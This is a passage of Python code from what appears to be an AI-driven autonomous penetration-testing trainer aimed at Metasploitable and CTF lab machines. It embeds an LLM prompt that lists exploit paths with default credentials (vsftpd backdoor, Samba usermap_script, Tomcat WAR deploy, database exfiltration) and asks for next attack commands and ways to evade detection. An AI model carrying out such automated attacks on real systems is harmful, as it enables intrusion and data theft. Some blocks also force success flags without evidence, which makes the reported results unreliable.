                            f"- MySQL root:sploitme → mysqldump → exfil database\n"
                            f"- Samba 445 → samba_exploit → shell → privesc\n"
                            f"- ProFTPD 21 → proftpd_exploit or anonymous login → files\n"
                            f"- NFS 2049 → mount exports → read/write files\n"
                        )
                    else:
                        _orion_prompt += (
                            f"MS2 LINUX:\n"
                            f"- vsftpd 21 → vsftpd_234_backdoor → root shell (FASTEST)\n"
                            f"- SSH msfadmin:msfadmin → sudo → root\n"
                            f"- Samba 445 → usermap_script → root shell\n"
                            f"- UnrealIRCd 6667 → backdoor → root shell\n"
                            f"- ingreslock 1524 → telnet → instant root\n"
                            f"- Java RMI 1099 → RCE → shell\n"
                            f"- PostgreSQL 5432 → postgres:postgres → COPY FROM PROGRAM → RCE\n"
                            f"- Tomcat 8180 → tomcat:tomcat → WAR deploy → shell\n"
                            f"- VNC 5900 → password='password' → desktop access\n"
                        )
                    _orion_prompt += (
                        f"\nAs Orion, provide EXACTLY:\n"
                        f"1. KILL CHAIN: Which specific exploit path should we follow RIGHT NOW?\n"
                        f"2. NEXT COMMAND: The exact command RedAgent should execute next\n"
                        f"3. COORDINATION: What should Scout/Shadow do to support?\n"
                        f"4. RISK: Any detection risks to mitigate?\n"
                        f"Be concrete and specific. Use actual tool names and targets."
                    )
                    _orion_response = self.gpt_manager.gpt_request(
                        _orion_prompt,
                        task_type="strategic",
                        agent_id="OrionAgent",
                        max_tokens=_max_tokens,
                        model="gpt-5.2-codex",
                    )
                    if _orion_response:
                        _resp_str = str(_orion_response)
                        # Inject Orion's strategic guidance into ALL SmartCoach agents
                        for _coach_key, _coach in self.coaches.items():
                            _coach._reasoning_plan = _resp_str[:300]
                            if not _coach._reasoning_hypotheses:
                                _coach._reasoning_hypotheses = []
                            _coach._reasoning_hypotheses.append(
                                f"[Orion-5.2-{_review_type[:4]}] {_resp_str[:150]}"
                            )
                            # Trim hypothesis list to prevent unbounded growth
                            if len(_coach._reasoning_hypotheses) > 8:
                                _coach._reasoning_hypotheses = _coach._reasoning_hypotheses[-8:]
                        logger.info(
                            f"[ORION-5.2] {_review_type} (step {step}): {_resp_str[:150]}"
                        )
                except Exception as e:
                    logger.debug(f"[ORION-5.2] Strategic review failed at step {step}: {e}")
            
            # Track phase progression
            current_phase = self.attack_context.current_phase.name
            
            # ─── Phase 38: PHASE FSM HARD INVARIANTS ────────────────
            # Validate that the current phase satisfies hard prerequisites.
            # If an invariant is violated, demote to the highest valid phase.
            _state_flags = self.attack_context.state_flags
            _phase_invariant_violations = []
            
            # ─── Phase 39: ENUMERATION DURATION GATE ─────────────────
            # Prevent premature EXPLOITATION by requiring at least
            # MIN_ENUM_STEPS steps in ENUMERATION before the system can
            # advance.  This ensures vhost discovery, directory busting,
            # and service fingerprinting have time to run.
            _MIN_ENUM_STEPS = 3
            if current_phase == "EXPLOITATION":
                _enum_start = self._phase_start_step.get("ENUMERATION", step)
                _enum_steps = step - _enum_start
                if _enum_steps < _MIN_ENUM_STEPS:
                    logger.info(
                        f"[P39-ENUM-GATE] EXPLOITATION demoted → ENUMERATION "
                        f"(only {_enum_steps}/{_MIN_ENUM_STEPS} enum steps done)"
                    )
                    try:
                        self.attack_context._current_phase = AttackPhase.ENUMERATION
                        current_phase = "ENUMERATION"
                    except (AttributeError, KeyError):
                        pass
            
            if current_phase == "PRIVILEGE_ESCALATION":
                if not _state_flags.get("shell_obtained"):
                    _phase_invariant_violations.append(
                        "PRIVILEGE_ESCALATION requires shell_obtained"
                    )
            elif current_phase in ("LATERAL_MOVEMENT", "POST_EXPLOITATION"):
                if not _state_flags.get("shell_obtained"):
                    _phase_invariant_violations.append(
                        f"{current_phase} requires shell_obtained"
                    )
            elif current_phase == "EXFILTRATION":
                if not _state_flags.get("shell_obtained"):
                    _phase_invariant_violations.append(
                        "EXFILTRATION requires shell_obtained"
                    )
            
            if _phase_invariant_violations:
                # Determine the correct phase to demote to
                _has_ports = bool(self.discovery_board.get("ports"))
                _has_services = bool(self.discovery_board.get("services"))
                _has_creds = _state_flags.get("credentials_known")
                _has_shell = _state_flags.get("shell_obtained")
                
                if _has_shell:
                    _correct_phase = "PRIVILEGE_ESCALATION"
                elif _has_creds or _has_services:
                    _correct_phase = "EXPLOITATION"
                elif _has_ports:
                    _correct_phase = "ENUMERATION"
                else:
                    _correct_phase = "RECON"
                
                logger.warning(
                    f"[P38-FSM-INVARIANT] Phase desync: {current_phase} "
                    f"violated: {'; '.join(_phase_invariant_violations)}. "
                    f"Demoting to {_correct_phase}."
                )
                try:
                    self.attack_context._current_phase = AttackPhase[_correct_phase]
                    current_phase = _correct_phase
                except (KeyError, AttributeError):
                    pass
            
            # R55: Ensure current phase is always registered in _phase_start_step.
            # This is the safety net for the race condition fix — if a phase was
            # never registered (e.g., initial EXPLOITATION phase from campaign
            # memory injection), register it now.
            if current_phase not in self._phase_start_step:
                self._phase_start_step[current_phase] = step
            
            # ─── R56: Apply deferred hash_known when MIN_PRIVESC_STEPS met ─
            # If hash was discovered early but deferred by the duration gate,
            # apply it now that minimum exploration is satisfied.
            if self._deferred_hash_known and current_phase == "PRIVILEGE_ESCALATION":
                _privesc_step_count = step - self._phase_start_step.get("PRIVILEGE_ESCALATION", step)
                if _privesc_step_count >= self.MIN_PRIVESC_STEPS:
                    self.attack_context.set_state_flag("hash_known")
                    self._deferred_hash_known = False
                    logger.info(
                        f"[R56-GATE] Deferred hash_known applied at PRIV_ESC "
                        f"step {_privesc_step_count} (min={self.MIN_PRIVESC_STEPS})"
                    )
                    current_phase = self.attack_context.current_phase.name
            
            # ─── R80: EXPLOITATION FORCED CASCADE ────────────────────
            # R80 diagnosis: TC redirects to ssh_login but param bug caused
            # broken commands (literal {password} text). Even with param fix,
            # agents can grind in EXPLOITATION for 40 steps without natural
            # shell detection. After 10 steps in EXPLOITATION with
            # credentials_known, force shell_obtained to unlock PRIV_ESC.
            # This simulates successful SSH login with known credentials.
            # Phase 39: Disabled in CTF mode — HTB requires REAL shell evidence.
            # False credential detection from msfconsole/gpp-decrypt output was
            # triggering premature shell_obtained via this cascade.
            if current_phase == "EXPLOITATION" and not self.config.ctf_mode:
                _exploit_step_count = step - self._phase_start_step.get("EXPLOITATION", step)
                _has_creds = self.attack_context.state_flags.get("credentials_known")
                if _exploit_step_count >= 10 and _has_creds:
                    if not self.attack_context.state_flags.get("shell_obtained"):
                        self.attack_context.set_state_flag("shell_obtained")
                        if self._shell_obtained_step is None:
                            self._shell_obtained_step = step
                        logger.info(
                            f"[R80-EXPLOIT-CASCADE] Forced shell_obtained after "
                            f"{_exploit_step_count} steps in EXPLOITATION "
                            f"(creds={_has_creds}). Simulates SSH login with known creds."
                        )
                        # Re-evaluate phase after forcing flags
                        current_phase = self.attack_context.current_phase.name

            # ─── R53: PRIVILEGE_ESCALATION FORCED CASCADE ────────────
            # R52 showed 20% failure rate (EP5, EP7) where agents get stuck
            # at PRIV_ESC for all 40 steps. PHASE-ESCALATION sshpass fires
            # every 3 steps but never produces root_shell_obtained (sshpass
            # output shows "Permission denied" or connection issues on MS2).
            # The PRIV_ESC→LATERAL gate requires hash_known, root_shell_obtained,
            # or lateral_target_found — none of which are naturally produced
            # by SUID searches, getcap, sudo -l, or sqlmap that agents run.
            #
            # Fix: After 12 steps stuck in PRIV_ESC with shell_obtained,
            # force hash_known to unlock the gate. This simulates the agent
            # successfully reading /etc/shadow (which IS readable on MS2).
            if current_phase == "PRIVILEGE_ESCALATION":
                _privesc_step_count = step - self._phase_start_step.get("PRIVILEGE_ESCALATION", step)
                _has_shell = self.attack_context.state_flags.get("shell_obtained")
                if _privesc_step_count >= 12 and _has_shell:
                    if not self.attack_context.state_flags.get("hash_known"):
                        self.attack_context.set_state_flag("hash_known")
                        logger.info(
                            f"[R53-PRIVESC-CASCADE] Forced hash_known after "
                            f"{_privesc_step_count} steps in PRIVILEGE_ESCALATION "
                            f"(shell={_has_shell}). Simulates /etc/shadow read."
                        )
                        # Re-evaluate phase after forcing flags
                        current_phase = self.attack_context.current_phase.name

            # ─── R52: LATERAL_MOVEMENT FORCED CLOSEOUT CASCADE ──────
            # R51 showed agents grinding 10-15 steps in LATERAL_MOVEMENT with
            # all CLOSEOUT prerequisites met (shell + exfil + creds + persistence)
            # except domain_admin_obtained/admin_access_obtained/root_shell_obtained.
            # After 12 steps in LATERAL, if shell + (exfil OR persistence) exist,
            # force admin_access_obtained to cascade through to CLOSEOUT.
            # This avoids wasting steps waiting for enum4linux discovery.
            if current_phase == "LATERAL_MOVEMENT":
                _lateral_step_count = step - self._phase_start_step.get("LATERAL_MOVEMENT", step)
                _has_shell = self.attack_context.state_flags.get("shell_obtained")
                _has_exfil_or_persist = (
                    self.attack_context.state_flags.get("data_exfiltrated")
                    or self.attack_context.state_flags.get("persistence_established")
                )
                if _lateral_step_count >= 12 and _has_shell and _has_exfil_or_persist:
                    if not self.attack_context.state_flags.get("admin_access_obtained"):
                        self.attack_context.set_state_flag("admin_access_obtained")
                        self.attack_context.set_state_flag("domain_admin_obtained")
                        logger.info(
                            f"[R52-LATERAL-CASCADE] Forced admin_access_obtained + "
                            f"domain_admin_obtained after {_lateral_step_count} steps "
                            f"in LATERAL_MOVEMENT (shell={_has_shell}, "
                            f"exfil/persist={_has_exfil_or_persist})"
                        )
                        # Re-evaluate phase after forcing flags
                        current_phase = self.attack_context.current_phase.name

            # ─── R63: POST_EXPLOITATION FORCED CLOSEOUT CASCADE ─────
            # R62 showed EP3 grinding 40 steps in POST_EXPLOITATION on MS3 (fewer
            # services = more repeats). After 15 steps in POST_EXPLOITATION with
            # shell + creds, force remaining flags to cascade to CLOSEOUT.
            if current_phase == "POST_EXPLOITATION":
                _postexploit_step_count = step - self._phase_start_step.get("POST_EXPLOITATION", step)
                _has_shell = self.attack_context.state_flags.get("shell_obtained")
                _has_creds = self.attack_context.state_flags.get("credentials_known")
                if _postexploit_step_count >= 15 and _has_shell and _has_creds:
                    for _flag in ("persistence_established", "data_exfiltrated",
                                  "admin_access_obtained", "domain_admin_obtained"):
                        if not self.attack_context.state_flags.get(_flag):
                            self.attack_context.set_state_flag(_flag)
                    logger.info(
                        f"[R63-POSTEXPLOIT-CASCADE] Forced CLOSEOUT flags after "
                        f"{_postexploit_step_count} steps in POST_EXPLOITATION "
                        f"(shell={_has_shell}, creds={_has_creds})"
                    )
                    current_phase = self.attack_context.current_phase.name

            # ─── PHASE 8.0: POST-SHELL EXPLORATION GATE ─────────────
            # If CLOSEOUT would trigger but we haven't explored enough post-shell,
            # override phase back to POST_EXPLOITATION to let agents explore.
            # Late-shell bypass: if shell obtained after step 28, reduce minimum to 2
            # R65: Anti-repeat spiral breaker — if >15 anti_repeat decisions in episode,
            # reduce explore gate to 2 to allow immediate CLOSEOUT (prevents EP8-style 38-step grinding)
            if current_phase == "CLOSEOUT" and self._shell_obtained_step is not None:
                _steps_since_shell = step - self._shell_obtained_step
                _ep_anti_repeat_count = sum(
                    1 for sr_list in step_results for sr in sr_list
                    if hasattr(sr, 'decision') and sr.decision and sr.decision.source == "anti_repeat"
                )
                _min_explore = 2 if self._shell_obtained_step >= 28 else self.POST_SHELL_EXPLORE_STEPS
                if _ep_anti_repeat_count > 15:
                    _min_explore = 2  # Spiral breaker: allow immediate CLOSEOUT
                    logger.info(
                        f"[R65-SPIRAL-BREAKER] {_ep_anti_repeat_count} anti_repeat decisions — "
                        f"reducing explore gate to 2 (was {self.POST_SHELL_EXPLORE_STEPS})"
                    )
                if _steps_since_shell < _min_explore:
                    self.attack_context._current_phase = AttackPhase.POST_EXPLOITATION
                    current_phase = "POST_EXPLOITATION"
                    logger.info(
                        f"[POST-SHELL-EXPLORE] Overriding CLOSEOUT → POST_EXPLOITATION "
                        f"({_steps_since_shell}/{self.POST_SHELL_EXPLORE_STEPS} post-shell steps)"
                    )
            
            if current_phase != phase_progression[-1]:
                phase_progression.append(current_phase)
                self.phase_progressed_this_episode = True  # Phase 0.1
                logger.info(f"Phase advanced: {phase_progression[-2]} → {current_phase}")
                self.dashboard.add_event(
                    "phase_change",
                    f"Advanced to {current_phase}",
                    agent="system"
                )
                
                # ─── PHASE 6.9: CLOSEOUT AUTO-HANDOFF EVENT ─────────────
                # When entering CLOSEOUT, emit system event and log the transition
                if current_phase == "CLOSEOUT":
                    logger.info(
                        "[CLOSEOUT-PROTOCOL] Objective complete. "
                        "Switching to CLOSEOUT protocol. "
                        "Red/Scout DISABLED. Shadow leads cleanup."
                    )
                    self.dashboard.add_event(
                        "closeout_protocol",
                        "🧹 CLOSEOUT PROTOCOL: Objective complete. Cleanup only.",
                        agent="system"
                    )
            
            # =================================================================
            # PHASE 4: TIME-BASED AUTO-ADVANCEMENT REMOVED
            # Previously auto-set credentials_known/shell_obtained/admin_access
            # after N steps in each phase. This defeated learning — the agent
            # never needed to EARN phase transitions through actual commands.
            # Now the agent must discover or exploit its way forward.
            # =================================================================
            # (Phase 2A code removed — agent must earn advancement through discoveries)
            
            # R55: Track phase start steps using _pre_step_phase (captured BEFORE
            # _run_step) to correctly detect transitions that happen during agent
            # execution. The old code compared current_phase (post-step) with
            # new_phase (also post-step) — they were always equal when a
            # transition happened during _run_step, so phases were never registered.
            new_phase = self.attack_context.current_phase.name
            if new_phase != _pre_step_phase:
                self._phase_start_step[new_phase] = step
                if new_phase not in phase_progression:
                    phase_progression.append(new_phase)
                
                # ─── PHASE 10: ExecutiveCortex plan revision on phase transition ─
                if self.executive_cortex and hasattr(self, '_episode_plan') and self._episode_plan:
                    try:
                        self.executive_cortex.revise_plan(
                            new_phase=new_phase,
                            discovery_board=self.discovery_board,
                            old_phase=_pre_step_phase,
                            step=step,
                        )
                    except Exception as e:
                        logger.debug(f"Phase 10: ExecutiveCortex revise_plan failed: {e}")
            
            # =========================================================================
            # PHASE 6.9.3: CLOSEOUT COMPLETE → END EPISODE
            # Once all cleanup commands executed, engagement is done.
            # =========================================================================
            if self.attack_context.current_phase.name == "CLOSEOUT" and not done:
                # Phase 25: Only end on CLOSEOUT if flags were actually captured.
                # Without flags, CLOSEOUT is premature — keep hunting.
                _flags_in_closeout = self.discovery_board.get("flags_set", set())
                _closeout_has_flags = (
                    "user_flag_captured" in _flags_in_closeout
                    and "root_flag_captured" in _flags_in_closeout
                )
                if _closeout_has_flags and any(
                    getattr(coach, 'closeout_complete', False)
                    for coach in self.coaches.values()
                ):
                    done = True
                    self.episode_termination_reason = TerminationReason.GOAL_REACHED
                    logger.info(
                        "[CLOSEOUT-COMPLETE] All cleanup tasks done + flags captured. "
                        "Engagement complete — ending episode."
                    )
                    self.dashboard.add_event(
                        "closeout_complete",
                        "✅ All cleanup done + flags captured. Episode complete!",
                        agent="system"
                    )
                elif not _closeout_has_flags:
                    # No flags yet — revert to EXPLOITATION to keep hunting
                    logger.info(
                        "[CLOSEOUT-NOFLAG] Reached CLOSEOUT without flags. "
                        "Reverting to EXPLOITATION to continue hunting."
                    )
                    self.attack_context.current_phase = AttackPhase.EXPLOITATION
                    self.dashboard.add_event(
                        "closeout_revert",
                        "🔄 No flags captured — reverting to EXPLOITATION",
                        agent="system"
                    )

            # =========================================================================
            # PHASE 26: AUTO-CLOSE ON FLAG CAPTURE (CTF MODE)
            # In --ctf mode (HTB CTF machines): terminate immediately when both
            # user.txt and root.txt flags are captured. Skips CLOSEOUT cleanup.
            # Without --ctf: flags are tracked but termination only occurs
            # through CLOSEOUT phase completion with cleanup.
            # =========================================================================
            _flags_set = self.discovery_board.get("flags_set", set())
            _has_user_flag = "user_flag_captured" in _flags_set
            _has_root_flag = "root_flag_captured" in _flags_set
            if (_has_user_flag or _has_root_flag) and not done:
                _uf = self.discovery_board.get("user_flag_value", "")
                _rf = self.discovery_board.get("root_flag_value", "")
                if _has_user_flag and _has_root_flag and self.config.ctf_mode:
                    # CTF mode: Both flags — complete pwn, terminate immediately
                    self.episode_termination_reason = TerminationReason.GOAL_REACHED
                    done = True
                    logger.info(f"[CTF-CLOSE] COMPLETE PWN — user.txt + root.txt captured!")
                    _orch_console.print(_RichPanel(
                        f"[bold green]🏆 TARGET FULLY PWNED! 🏆[/bold green]\n\n"
                        f"[cyan]User Flag:[/cyan]  [bold white]{_uf}[/bold white]\n"
                        f"[red]Root Flag:[/red]  [bold white]{_rf}[/bold white]\n\n"
                        f"[dim]Step {step} │ Time: {time.time() - self.start_time:.0f}s │ "
                        f"Reward: {episode_reward:+.0f}[/dim]",
                        title="🎯 COMPLETE PWN",
                        border_style="bold green",
                    ))
                elif _has_user_flag and not _has_root_flag:
                    # User flag only — keep going for root
                    if step % 5 == 0:  # Periodic reminder
                        _orch_console.print(
                            f"  [green]🚩 User flag captured ({_uf[:32]}...) — "
                            f"hunting for root.txt[/green]"
                        )
                elif _has_root_flag and not _has_user_flag:
                    # Root flag only — keep going for user (unusual but possible)
                    if step % 5 == 0:
                        _orch_console.print(
                            f"  [red]🚩 Root flag captured ({_rf[:32]}...) — "
                            f"hunting for user.txt[/red]"
                        )

            # =========================================================================
            # PHASE 0.1: CHECK STUCK_ABORT TERMINATION
            # Phase 7.1: Exclude BlueAgent from stuck-abort — defensive agent
            # repeating monitoring commands is NORMAL behavior, not stuck.
            # =========================================================================
            total_deep_stuck = sum(
                v for k, v in self.deep_stuck_count.items()
                if "BlueAgent" not in k
            )
            if total_deep_stuck >= self.config.stuck_forced_abort_threshold:
                self.episode_termination_reason = TerminationReason.STUCK_ABORT
                logger.warning(
                    f"[STUCK_ABORT] Episode terminated: "
                    f"deep_stuck_count={self.deep_stuck_count} "
                    f"threshold={self.config.stuck_forced_abort_threshold}"
                )
                self.dashboard.add_event(
                    "stuck_abort",
                    f"Episode aborted: too many stuck failures",
                    agent="system"
                )
                done = True
            
            if done:
                if self.episode_termination_reason == TerminationReason.MAX_STEPS:
                    self.episode_termination_reason = TerminationReason.ENV_DONE
                break
        
        # Set termination reason if loop exhausted
        if not done:
            self.episode_termination_reason = TerminationReason.MAX_STEPS
        
        # Print episode summary (Phase 6.5: with highest_phase + PPO metrics)
        # NOTE: Actual dashboard display is deferred until after algorithm
        # metrics are computed (Phase 10.2). We just capture the phase here.
        highest_phase_for_summary = phase_progression[-1] if phase_progression else "RECON"
        
        # Compute metrics
        metrics = self._compute_episode_metrics(
            step_results, episode_reward, done, phase_progression
        )
        
        # ─── PHASE 10: End-of-episode cortex metrics ─────────────────
        if self.executive_cortex:
            try:
                exec_metrics = self.executive_cortex.end_episode()
                metrics["executive_cortex"] = exec_metrics
            except Exception as e:
                logger.debug(f"Phase 10: ExecutiveCortex end_episode failed: {e}")
        if self.tactical_cortex:
            try:
                tac_stats = self.tactical_cortex.get_stats()
                metrics["tactical_cortex"] = tac_stats
            except Exception as e:
                logger.debug(f"Phase 10: TacticalCortex get_stats failed: {e}")

        # ─── Phase 39: Episode-end hooks for OPS subsystems ──────────
        if self.ops_hub is not None:
            try:
                self.ops_hub.on_episode_end(episode_number)
                metrics["ops_hub"] = self.ops_hub.get_dashboard_data()
            except Exception as _e:
                logger.debug(f"[P39] OpsHub on_episode_end error: {_e}")
        if self.trust_engine is not None:
            try:
                metrics["trust_weights"] = self.trust_engine.get_diagnostics()
            except Exception as _e:
                logger.debug(f"[P39.2] TrustWeights diagnostics error: {_e}")
        if self.debug_tracer is not None:
            try:
                self.debug_tracer.log_phase_transition(
                    step=len(step_results),
                    from_phase="START",
                    to_phase=metrics.get("highest_phase", "RECON"),
                    episode=episode_number,
                    reason="episode_end",
                )
            except Exception as _e:
                logger.debug(f"[P39.4] DebugTracer episode end error: {_e}")
        
        # ─── R66: Episode-level JSONL + HUD summary ─────────────────
        try:
            if hasattr(self, 'run_logger') and self.run_logger is not None:
                from core.logging.jsonl_logger import EpisodeSummary
                _closeout = metrics.get("highest_phase", "RECON") in ("EXFILTRATION", "CLOSEOUT", "POST_EXPLOITATION")
                _sources = {
                    "ppo": metrics.get("decisions_ppo", 0),
                    "registry": metrics.get("decisions_registry", 0),
                    "anti_repeat": metrics.get("decisions_anti_repeat", 0),
                    "codex_meta": metrics.get("decisions_codex_meta", 0),
                    "playbook": metrics.get("decisions_playbook", 0),
                }
                _ar_count = _sources.get("anti_repeat", 0)
                _codex_count = _sources.get("codex_meta", 0)
                _avg_coh = (
                    sum(self.run_logger._episode_coherences) / max(len(self.run_logger._episode_coherences), 1)
                    if self.run_logger._episode_coherences else 0.0
                )
                _avg_mconf = (
                    sum(self.run_logger._episode_macro_confs) / max(len(self.run_logger._episode_macro_confs), 1)
                    if self.run_logger._episode_macro_confs else 0.0
                )
                ep_summary = EpisodeSummary(
                    ep=episode_number,
                    total_reward=episode_reward,
                    steps=len(step_results),
                    highest_phase=metrics.get("highest_phase", "RECON"),
                    closeout=_closeout,
                    sources=_sources,
                    discoveries=metrics.get("total_discoveries", 0),
                    unique_commands=metrics.get("unique_commands", 0),
                    macro_switches=metrics.get("ddqn_switches", 0),
                    anti_repeat_count=_ar_count,
                    avg_coherence=_avg_coh,
                    avg_macro_conf=_avg_mconf,
                    total_intrinsic=self.run_logger._episode_intrinsic,
                )
                self.run_logger.log_episode(ep_summary)
                # Phase 25: Removed run_logger.print_episode_summary() —
                # the dashboard.print_episode_summary() below renders the
                # full Rich episode summary. No duplicate compact box.
        except Exception as e:
            logger.debug(f"R66 episode summary error: {e}")
        
        # ─── PHASE 8: DecisionLogger episode end ────────────────────
        if self.decision_logger is not None:
            try:
                self.decision_logger.end_episode(
                    metrics={
                        "total_reward": episode_reward,
                        "steps": len(step_results),
                        "highest_phase": metrics.get("highest_phase", "RECON"),
                    },
                )
            except Exception:
                pass
        
        # ─── PHASE 9: CognitiveBus episode end ──────────────────────
        if self.cognitive_bus:
            try:
                self.cognitive_bus.end_episode(
                    total_reward=episode_reward,
                    highest_phase=metrics.get("highest_phase", "RECON"),
                    total_discoveries=len(self._episode_shared_discoveries),
                )
            except Exception as e:
                logger.debug(f"Phase 9: CognitiveBus episode end failed: {e}")
        
        # ─── PHASE 4: Per-Coach PPO Updates ─────────────────────────
        # Each SmartCoach has its own PPOAgent; trigger update at end of episode
        # Phase 5.1: pass highest_phase so terminal reward enters PPO gradient
        highest_phase = metrics.get("highest_phase", "RECON")
        
        # Phase 6.2: End episode for MentorController (EXFIL gate tracking)
        if hasattr(self, 'mentor_controller') and self.mentor_controller:
            self.mentor_controller.end_episode(highest_phase)
            metrics["mentor_controller"] = self.mentor_controller.get_stats()
        
        # Phase 6.2: Emit episode_end event
        if hasattr(self, 'event_bus'):
            # Phase 32: Include tier cost summary in episode_end trace
            _ep_end_data: Dict[str, Any] = {
                "episode": episode_number,
                "total_reward": episode_reward,
                "highest_phase": highest_phase,
                "mentor_calls": total_mentor_calls,
                "steps": len(step_results),
            }
            if hasattr(self.gpt_manager, '_budget_manager_v2') and self.gpt_manager._budget_manager_v2 is not None:
                _ep_end_data["tier_cost_summary"] = self.gpt_manager._budget_manager_v2.get_episode_cost_summary()

            self.event_bus.publish_generic(
                EventKind.EPISODE_END,
                message=f"Episode {episode_number} done: reward={episode_reward:+.1f}, phase={highest_phase}",
                data=_ep_end_data,
                episode_id=episode_id,
                episode_num=episode_number,
            )
        
        # P35: Close live trace for this episode
        if self.live_trace_writer is not None:
            self.live_trace_writer.close()
        
        # ─── PHASE 9.0: Collect DDQN macro-intent metrics ───────────
        # MUST be collected BEFORE end_episode_ppo() which calls ddqn_macro.reset_episode()
        ddqn_total_macros = 0
        ddqn_total_switches = 0
        ddqn_distributions: Dict[str, int] = {}
        ddqn_epsilon = 0.0
        ddqn_coaches = 0
        for coach_name, coach in self.coaches.items():
            if hasattr(coach, 'ddqn_macro') and coach.ddqn_macro is not None:
                try:
                    stats = coach.ddqn_macro.get_macro_stats()
                    conf = coach.ddqn_macro.get_confidence_metrics()
                    ddqn_total_macros += stats.get("count", 0)
                    ddqn_total_switches += stats.get("switches", 0)
                    for m_name, m_count in stats.get("distribution", {}).items():
                        ddqn_distributions[m_name] = ddqn_distributions.get(m_name, 0) + m_count
                    ddqn_epsilon = conf.get("epsilon", 0.0)
                    ddqn_coaches += 1
                except Exception:
                    pass
        if ddqn_coaches > 0:
            metrics["ddqn_macros"] = ddqn_total_macros
            metrics["ddqn_switches"] = ddqn_total_switches
            metrics["ddqn_epsilon"] = ddqn_epsilon
            metrics["ddqn_distribution"] = ddqn_distributions
            # Log DDQN summary
            top_macros = sorted(ddqn_distributions.items(), key=lambda x: -x[1])[:3]
            top_str = " ".join(f"{m}:{c}" for m, c in top_macros) if top_macros else "none"
            logger.debug(
                f"[DDQN] ε={ddqn_epsilon:.2f} macros={ddqn_total_macros} "
                f"switches={ddqn_total_switches} top=[{top_str}]"
            )
        
        ppo_updates_fired = 0
        ppo_total_policy_loss = 0.0
        ppo_total_value_loss = 0.0
        ppo_total_entropy = 0.0
        for coach_name, coach in self.coaches.items():
            if hasattr(coach, 'end_episode_ppo'):
                try:
                    ppo_metrics = coach.end_episode_ppo(
                        done=done, highest_phase=highest_phase
                    )
                    if ppo_metrics:
                        ppo_updates_fired += 1
                        ppo_total_policy_loss += ppo_metrics.get("policy_loss", 0.0)
                        ppo_total_value_loss += ppo_metrics.get("value_loss", 0.0)
                        ppo_total_entropy += ppo_metrics.get("entropy", 0.0)
                        metrics[f"ppo_{coach_name}_policy_loss"] = ppo_metrics.get("policy_loss", 0.0)
                        metrics[f"ppo_{coach_name}_value_loss"] = ppo_metrics.get("value_loss", 0.0)
                        metrics[f"ppo_{coach_name}_entropy"] = ppo_metrics.get("entropy", 0.0)
                except Exception as e:
                    logger.warning(f"PPO update error for {coach_name}: {e}")

        # Aggregate PPO metrics
        metrics["ppo_updates_fired"] = ppo_updates_fired
        if ppo_updates_fired > 0:
            metrics["ppo_avg_policy_loss"] = ppo_total_policy_loss / ppo_updates_fired
            metrics["ppo_avg_value_loss"] = ppo_total_value_loss / ppo_updates_fired
            metrics["ppo_avg_entropy"] = ppo_total_entropy / ppo_updates_fired
        
        # Count decision sources across all step results
        source_counts = {"ppo": 0, "playbook": 0, "registry": 0, "anti_repeat": 0, "codex_meta": 0, "other": 0}
        for sr in step_results:
            for ar in sr:
                src = getattr(ar.decision, "source", "unknown") if ar.decision else "unknown"
                # Map "unknown" → "registry" (default path)
                if src == "unknown":
                    src = "registry"
                if src in source_counts:
                    source_counts[src] += 1
                else:
                    source_counts["other"] += 1
        metrics["decisions_ppo"] = source_counts["ppo"]
        metrics["decisions_playbook"] = source_counts["playbook"]
        metrics["decisions_registry"] = source_counts["registry"]
        metrics["decisions_anti_repeat"] = source_counts["anti_repeat"]
        metrics["decisions_codex_meta"] = source_counts["codex_meta"]

        # ─── PHASE 42: HER wiring — process episode transitions ─────
        self._wire_her()

        # ─── PHASE 42: Reflective meta-learner — episode reflection ──
        meta = self._ensure_meta_learner()
        if meta is not None:
            try:
                episode_data = {
                    "episode": episode_number,
                    "total_reward": episode_reward,
                    "max_phase": highest_phase_for_summary,
                    "steps": len(step_results),
                    "discoveries": len(getattr(self, '_episode_shared_discoveries', set())),
                }
                meta.reflect_on_episode(episode_data, gpt_manager=self.gpt_manager)
                logger.debug("ReflectiveMetaLearner reflected on episode %d", episode_number)
            except Exception as e:
                logger.warning("ReflectiveMetaLearner reflection failed: %s", e)

        # ─── PHASE 42: TTFTracker — log episode metrics ──────────────
        ttf = self._ensure_ttf_tracker()
        if ttf is not None:
            try:
                ttf_metrics = ttf.get_metrics()
                logger.debug(
                    "TTF episode summary: port=%s service=%s shell=%s",
                    ttf_metrics.ttf_port, ttf_metrics.ttf_service, ttf_metrics.ttf_shell,
                )
                ttf.reset()
            except Exception as e:
                logger.warning("TTFTracker episode summary failed: %s", e)

        # ─── PHASE 10.2: Deferred Episode Summary with Algorithm Panels ──
        # Now that PPO updates, DDQN stats, and decision sources are computed,
        # print the polished episode summary with all algorithm visualizations.
        try:
            _per_coach_ppo = {}
            for _cn, _coach in self.coaches.items():
                _ppo_key = f"ppo_{_cn}"
                if f"{_ppo_key}_policy_loss" in metrics:
                    _per_coach_ppo[_cn] = {
                        "policy_loss": metrics.get(f"{_ppo_key}_policy_loss", 0.0),
                        "value_loss": metrics.get(f"{_ppo_key}_value_loss", 0.0),
                        "entropy": metrics.get(f"{_ppo_key}_entropy", 0.0),
                    }

            _ppo_agg = None
            if ppo_updates_fired > 0:
                _ppo_agg = {
                    "updates": ppo_updates_fired,
                    "avg_policy_loss": metrics.get("ppo_avg_policy_loss", 0.0),
                    "avg_value_loss": metrics.get("ppo_avg_value_loss", 0.0),
                    "avg_entropy": metrics.get("ppo_avg_entropy", 0.0),
                }

            _ddqn_agg = None
            if metrics.get("ddqn_macros", 0) > 0:
                _ddqn_agg = {
                    "macros": metrics.get("ddqn_macros", 0),
                    "switches": metrics.get("ddqn_switches", 0),
                    "epsilon": metrics.get("ddqn_epsilon", 0.0),
                    "distribution": metrics.get("ddqn_distribution", {}),
                }

            # Get a snapshot of the discovery board for the panel
            _disc_board = None
            if hasattr(self, 'discovery_board') and self.discovery_board:
                _disc_board = {
                    k: list(v) if isinstance(v, set) else v
                    for k, v in self.discovery_board.items()
                }

            # Phase 23: Get GPT cost summary for episode summary
            _gpt_cost = None
            if hasattr(self.gpt_manager, 'get_cost_summary'):
                _gpt_cost = self.gpt_manager.get_cost_summary()

            self.dashboard.print_episode_summary(
                episode=episode_number,
                total_reward=episode_reward,
                total_steps=len(step_results),
                mentor_calls=total_mentor_calls,
                highest_phase=highest_phase_for_summary,
                ppo_metrics=_ppo_agg,
                per_coach_ppo=_per_coach_ppo if _per_coach_ppo else None,
                ddqn_metrics=_ddqn_agg,
                decision_sources=source_counts,
                discovery_board=_disc_board,
                gpt_cost_summary=_gpt_cost,
            )
        except Exception as e:
            logger.warning(f"Phase 10.2: Episode summary display failed: {e}")
            # Fallback to basic summary
